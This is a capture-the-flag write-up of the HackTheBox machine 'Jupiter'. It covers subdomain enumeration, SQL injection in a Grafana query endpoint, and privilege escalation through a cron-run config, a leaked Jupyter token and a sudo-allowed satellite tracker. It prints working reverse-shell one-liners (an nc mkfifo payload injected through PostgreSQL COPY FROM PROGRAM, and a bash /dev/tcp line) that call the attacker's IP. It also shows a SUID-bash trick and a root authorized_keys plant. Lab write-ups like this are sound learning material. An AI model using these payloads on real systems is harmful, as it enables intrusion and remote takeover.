---
description: >-
  My writeup on the medium difficulty retired machine Jupter from hackthebox.eu.
  For this box, I will be using the new guided mode as I tend to struggle on
  medium-level boxes.
---

# HTB - Jupiter

## Overview

The foothold was simple enumeration and then request inspection from which we got an SQLi and then a shell. For the user we had to get a shell as the user juno by manipulating a hidden cron job that ran every 2 minutes, this part caused me a lot of trouble because I was initially trying to write a reverse shell which didnt work for some reason, what I did instead was edit the script to copy bash to /tmp and apply group permissions to it which after running gave me a shell as Juno. For root the user jovian had sudo permissions for an application called sattrack, we had to run strings to find the config file which we manipulated to put our authorized\_keys file in root/.ssh folder.

A very interesting box and a great learning experience, even though I did struggle quite a bit and it took me very long.

## User:

### Nmap

As per standard, we start with an nmap scan, the -p- flag is for all ports, the -sC is for scripts and -sV is to enumerate service versions.

{% code overflow="wrap" fullWidth="false" %}
```
   ~ nmap -p- -sC -sV jupiter.htb
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-31 13:36 GMT
Nmap scan report for jupiter.htb (10.10.11.216)
Host is up (0.054s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 ac:5b:be:79:2d:c9:7a:00:ed:9a:e6:2b:2d:0e:9b:32 (ECDSA)
|_  256 60:01:d7:db:92:7b:13:f0:ba:20:c6:c9:00:a7:1b:41 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Home | Jupiter
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 54.96 seconds
```
{% endcode %}

1. How many TCP ports are listening on Jupiter? 2 Ports are open

There are the two typical ports open, ssh and port 80 which is a http server

Looking at the web page its a website about a company called jupiter and they offer all sorts of space related services.

<figure><img src="HacktheBox/.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

### Subdomain Enum

The next thing I do is enumerate the subdomains because the page jupiter.htb doesnt seem to have anything out of the ordinary, using ffuf I enumerate the subdomains next. I use a seclists wordlist and fuzz through the Host header with the -fc 301 which is to ignore the status code 301.

{% code overflow="wrap" fullWidth="false" %}
```
>>>  ~ ffuf -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://jupiter.htb/ -H "Host: FUZZ.jupiter.htb" -fc 301

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.5.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://jupiter.htb/
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
 :: Header           : Host: FUZZ.jupiter.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response status: 301
________________________________________________

kiosk                   [Status: 200, Size: 34390, Words: 2150, Lines: 212, Duration: 60ms]
```
{% endcode %}

Only one subdomain comes back which is kiosk, this answers the second question.

2. What is the full domain name used by the "Moons" dashboard? kiosk.jupiter.htb

Adding this to our hosts file, I view the page and its a page called Moons - Dashboards - Grafana, its a website hosted using grafana and it contains information about moons.

<div align="right" data-full-width="false">

<figure><img src="HacktheBox/.gitbook/assets/image (32).png" alt=""><figcaption></figcaption></figure>

</div>

3. What software is kiosk.jupiter.htb built with? Grafana

We can see from the title and wappalyzer, the site is built using grafana.

I interact with the website going clicking on links and looking at the requests and forwading them, while doing this I notice to retrieve the information about Moons, it sends a sql request that I can freely manipulate.

4. What is the relative web path that contains raw SQL queries in the POST JSON body? /api/ds/query

<figure><img src="HacktheBox/.gitbook/assets/image (33).png" alt=""><figcaption><p>Post request to api/ds/query</p></figcaption></figure>

### Foothold - SQLi

Exporting this request to a file called sqlrequest.txt, I feed it to sqlmap in order to gain a shell or some more information. We know the database is Postgresql as its in the request.

`sqlmap -r "/home/shiki/sqlrequest.txt" --os-shell --dbms=PostgreSQL`

After a while we get an os-shell.

<figure><img src="HacktheBox/.gitbook/assets/image (34).png" alt=""><figcaption></figcaption></figure>

The os shell is quite slow so I put a command in for a reverse shell, but this shell disappears after some time:

<div data-full-width="false">

<figure><img src="HacktheBox/.gitbook/assets/image (36).png" alt=""><figcaption></figcaption></figure>

</div>

But know that we have an os-shell we know a payload that works and scrolling up in the sqlmap output it says that the command execution used was the "COPY ..... FROM PROGRAM" I researched this and found this medium article, it discusses many ways of code execution and one of them is the one sqlmap used.

{% embed url="https://medium.com/r3d-buck3t/command-execution-with-postgresql-copy-command-a79aef9c2767" %}

Scrolling down I found what I was looking for,

<figure><img src="HacktheBox/.gitbook/assets/image (37).png" alt=""><figcaption></figcaption></figure>

I went back to burpsuite and inserted the command with my ip and port where sqlmap inserted their payload:

{% code overflow="wrap" %}
```
"rawSql":"select \n  name as \"Name\", \n  parent as \"Parent Planet\", \n  meaning as \"Name Meaning\" \nfrom \n  moons \nwhere \n  parent = 'Saturn' \norder by \n  name desc;;COPY shell FROM PROGRAM './rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.74 1234 >/tmp/f';--",
```
{% endcode %}

I upgraded my reverse shell from a basic one to a stabilized one:

> python3 -c 'import pty;pty.spawn("/bin/bash")'
>
> ctrl+z
>
> stty raw -echo; fg
>
> export TERM=xterm
>
> Press enter

Now we have a fully functioning shell we can properly enumerate.

The next question is;

6. What is the full path to the script that is running as UID 1000 every two minutes?

We need to analyze a script that runs every two minutes, I am going to use pspy for this, I upload pspy32 from my local machine and view the output. After waiting a bunch of commands are executed by UID 1000 which is user juno. First they execute a script called shadow-simulation.sh in their directory whcih removes the file /dev/shm/shadow.data and runs the binary shadow on /dev/shm/network.yml. This network-simulation.yml is a file we have write access to.

<div data-full-width="true">

<figure><img src="HacktheBox/.gitbook/assets/image (40).png" alt=""><figcaption></figcaption></figure>

</div>

Below is the network-simulation.yml file:

```
general:
  # stop after 10 simulated seconds
  stop_time: 10s
  # old versions of cURL use a busy loop, so to avoid spinning in this busy
  # loop indefinitely, we add a system call latency to advance the simulated
  # time when running non-blocking system calls
  model_unblocked_syscall_latency: true

network:
  graph:
    # use a built-in network graph containing
    # a single vertex with a bandwidth of 1 Gbit
    type: 1_gbit_switch

hosts:
  # a host with the hostname 'server'
  server:
    network_node_id: 0
    processes:
    - path: /usr/bin/python3
      args: -m http.server 80
      start_time: 3s
  # three hosts with hostnames 'client1', 'client2', and 'client3'
  client:
    network_node_id: 0
    quantity: 3
    processes:
    - path: /usr/bin/curl
      args: -s server
      start_time: 5s
```

My initial idea was to get a reverse shell either using curl or python which are already used and I would just need to change the args, but after trying I could get it to work. So I changed my approach to using bash and group permissions. I edit the script so that It copies a bash binary and applies permissions so that when I run it with -p I get a shell as Juno.

```
general:
  # stop after 10 simulated seconds
  stop_time: 10s
  # old versions of cURL use a busy loop, so to avoid spinning in this busy
  # loop indefinitely, we add a system call latency to advance the simulated
  # time when running non-blocking system calls
  model_unblocked_syscall_latency: true

network:
  graph:
    # use a built-in network graph containing
    # a single vertex with a bandwidth of 1 Gbit
    type: 1_gbit_switch

hosts:
  # a host with the hostname 'server'
  server:
    network_node_id: 0
    processes:
    - path: /usr/bin/cp
      args: /bin/bash /tmp/bash
      start_time: 3s
  # three hosts with hostnames 'client1', 'client2', and 'client3'
  client:
    network_node_id: 0
    quantity: 3
    processes:
    - path: /usr/bin/chmod
      args: u+s /tmp/bash
      start_time: 5s
```

I apply this and after a while I run /tmp/bash -p and get a shell as juno !

<figure><img src="HacktheBox/.gitbook/assets/image (42).png" alt=""><figcaption></figcaption></figure>

But if I try to cat user.txt, I get permission denied due to my uid not being juno. We know that shadow-simulation.sh (which is a file in juno's directory) is run every two minutes, but now we have permissions as juno so we can edit it and get a reverse shell from this script, I use a line from revshells.com.

```
bash-5.1$ cat shadow-simulation.sh
#!/bin/bash
cd /dev/shm
rm -rf /dev/shm/shadow.data
/home/juno/.local/bin/shadow /dev/shm/*.yml
cp -a /home/juno/shadow/examples/http-server/network-simulation.yml /dev/shm/
bash -i >& /dev/tcp/10.10.16.74/1244 0>&1
```

```
   ~ nc -lvnp 1244
Connection from 10.10.11.216:60936
bash: cannot set terminal process group (45335): Inappropriate ioctl for device
bash: no job control in this shell
juno@jupiter:/dev/shm$
```

```
juno@jupiter:~$ cat user.txt
cat user.txt
5de6512a71cd*******************
juno@jupiter:~$
```

And we have got our user!

I add myself to the .ssh/authorized\_keys file just for convience purposes and proceed with root.

## Root

I run linpeas as usual and the user juno has a group set as science.

8. Besides the juno group, what other group is juno a part of? science

<figure><img src="HacktheBox/.gitbook/assets/image (43).png" alt=""><figcaption></figcaption></figure>

9. What software is listening on TCP port 8888? Jupyter

To access the service running on port 8888, we need to do some tunnelling. I use ssh with the -L flag with the first number being the local port and then after localhost is the remote port:\
`ssh -L 1234:localhost:8888 juno@jupiter.htb`

Now we can access the service through our localhost on port 1234.

### Jupyter Notebook

Navigating there I see an application called Jupyter Notebook.

<div data-full-width="false">

<figure><img src="HacktheBox/.gitbook/assets/image (44).png" alt=""><figcaption></figcaption></figure>

</div>

We need a token or password to proceed with this application, doing some research around it Jupyter has a file extension .ipynb:

> What is a Jupyter file? The ipynb file extension is associated with Jupyter Notebook, a web-based interactive computing environment that allows you to create and share documents that contain live code, equations, visualizations, and narrative text. To open an ipynb file, you need to have Jupyter Notebook installed on your computer.

With this information i begin looking for files that have this extension and I get a lot of results but the python ones wont contain any logs, the only other option is the /opt/solar-flares/ folder, navigating there there is a folder for logs.

10. What is the full path to the folder that contains log files where the Jupyter pin is leaked? /opt/solar-flares/logs

<pre data-overflow="wrap"><code>juno@jupiter:~$ find / -name "*.ipynb" 2>/dev/null
/opt/solar-flares/flares.ipynb
/usr/local/lib/python3.10/dist-packages/notebook/bundler/tests/resources/empty.ipynb
<strong>...etc...
</strong>juno@jupiter:~$
</code></pre>

In the logs folder there are logs of multiple dates, looking at the one from today it has the following inside it:

```
juno@jupiter:/opt/solar-flares/logs$ cat jupyter-2023-10-31-56.log
[W 05:56:11.191 NotebookApp] Terminals not available (error was No module named 'terminado')
[I 05:56:11.200 NotebookApp] Serving notebooks from local directory: /opt/solar-flares
[I 05:56:11.200 NotebookApp] Jupyter Notebook 6.5.3 is running at:
[I 05:56:11.200 NotebookApp] http://localhost:8888/?token=c772d8e0e32ef84c360eee2d935f58aef582fc7df7b1dcf3
[I 05:56:11.200 NotebookApp]  or http://127.0.0.1:8888/?token=c772d8e0e32ef84c360eee2d935f58aef582fc7df7b1dcf3
[I 05:56:11.200 NotebookApp] Use Control-C to stop this server and shut down all kernels (twice to skip confirmation).
[W 05:56:11.206 NotebookApp] No web browser found: could not locate runnable browser.
[C 05:56:11.206 NotebookApp]

    To access the notebook, open this file in a browser:
        file:///home/jovian/.local/share/jupyter/runtime/nbserver-1172-open.html
    Or copy and paste one of these URLs:
        http://localhost:8888/?token=c772d8e0e32ef84c360eee2d935f58aef582fc7df7b1dcf3
     or http://127.0.0.1:8888/?token=c772d8e0e32ef84c360eee2d935f58aef582fc7df7b1dcf3
[I 17:30:18.608 NotebookApp] 302 GET / (127.0.0.1) 1.320000ms
[I 17:30:18.609 NotebookApp] 302 GET / (127.0.0.1) 2.200000ms
[I 17:30:18.609 NotebookApp] 302 GET / (127.0.0.1) 2.620000ms
[I 17:30:18.610 NotebookApp] 302 GET / (127.0.0.1) 2.830000ms
[I 17:30:18.832 NotebookApp] 302 GET /tree? (127.0.0.1) 0.890000ms
```

The token is what we need and it seems we can put it into our url instead, putting the ?token=c772d8e0e32ef84c360eee2d935f58aef582fc7df7b1dcf3 gave me access to the "tree" page. There's a listing of files, running and clusters. This is just the folder called /opt/solar-flares.

<figure><img src="HacktheBox/.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>

Playing around with the web application theres an option to upload or create a file, if i click on new it gives the option of running python3 commands from the browser from this we can execute our own code using the os.system function.

### Python3 RCE

<figure><img src="HacktheBox/.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

Running whoami in the python3 file we can get a shell as the user jovian! Now we can execute commands as jovian, first thing we should do is get a proper shell. I grab a line from revshells.com selecting python3 and running it gives us a shell.\\

<figure><img src="HacktheBox/.gitbook/assets/image (49).png" alt=""><figcaption></figcaption></figure>

### Sattrack Sudo

One of the first things we do stabilise the shell but I have already posted how to do that previously. After we have gotten a stable shell I run sudo -l as part of enumeration and we immediately find that we can run sattrack as sudo with no password.

<pre data-overflow="wrap"><code><strong>jovian@jupiter:~/.jupyter$ sudo -l                      
</strong>sudo -l
Matching Defaults entries for jovian on jupiter:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User jovian may run the following commands on jupiter:
    (ALL) NOPASSWD: /usr/local/bin/sattrack
</code></pre>

13. What is the full path to the program that jovian can run as root without a password? /usr/local/bin/sattrack

If we try to run sattrack as sudo it throws an error:\
`Satellite Tracking System Configuration file has not been found. Please try again!`

I download the sattrack binary to my machine and run `strings | grep config`. The output shows that it expects a config file to be `/tmp/config.json.`

But we dont have a config.json in tmp right now so I run a find command to look for one `find / -name "config.json" 2>/dev/null` and there is an already existing config in /usr/local/share/sattrack/config.json.

14. What is the full path to the example sattrack config file on Jupiter? /usr/local/share/sattrack/config.json

```
jovian@jupiter:~$ cat /usr/local/share/sattrack/config.json
{
	"tleroot": "/tmp/tle/",
	"tlefile": "weather.txt",
	"mapfile": "/usr/local/share/sattrack/map.json",
	"texturefile": "/usr/local/share/sattrack/earth.png",
	
	"tlesources": [
		"http://celestrak.org/NORAD/elements/weather.txt",
		"http://celestrak.org/NORAD/elements/noaa.txt",
		"http://celestrak.org/NORAD/elements/gp.php?GROUP=starlink&FORMAT=tle"
	],
	
	"updatePerdiod": 1000,
	
	"station": {
		"name": "LORCA",
		"lat": 37.6725,
		"lon": -1.5863,
		"hgt": 335.0
	},
	
	"show": [
	],
	
	"columns": [
		"name",
		"azel",
		"dis",
		"geo",
		"tab",
		"pos",
		"vel"
	]
}
```

Running sudo sattrack with the config copied to the /tmp folder, it creates a directory /tmp/tle if it doesnt already exist and it downloads the file weather.txt from the tlesources list, since its being run as root we pretty much upload any file we wish into the root directory but thinking of one that will give us a shell took me some time.

After a while I thought that what we can do is put our own authorized\_keys file in the .ssh folder of root. We would do this by first creating the authorized\_keys file by copying id\_rsa into authorized\_keys and then hosting a python server. Then we add that to the sources list and change the tle root to /root/.ssh/ (the folder we want to upload to) and the tlefile to authorized\_keys (the file to upload). We also add the link to our python server with authorized\_keys file.

<figure><img src="HacktheBox/.gitbook/assets/image (50).png" alt=""><figcaption></figcaption></figure>

Now running sudo sattrack, and hosting our python server.

<figure><img src="HacktheBox/.gitbook/assets/image (51).png" alt=""><figcaption></figcaption></figure>

The file has been successfully transferred and attempting to ssh:

<figure><img src="HacktheBox/.gitbook/assets/image (52).png" alt=""><figcaption></figcaption></figure>

We are now ROOT! This last part had me thinking for quite a bit I didn't think of such a creative way to get root.
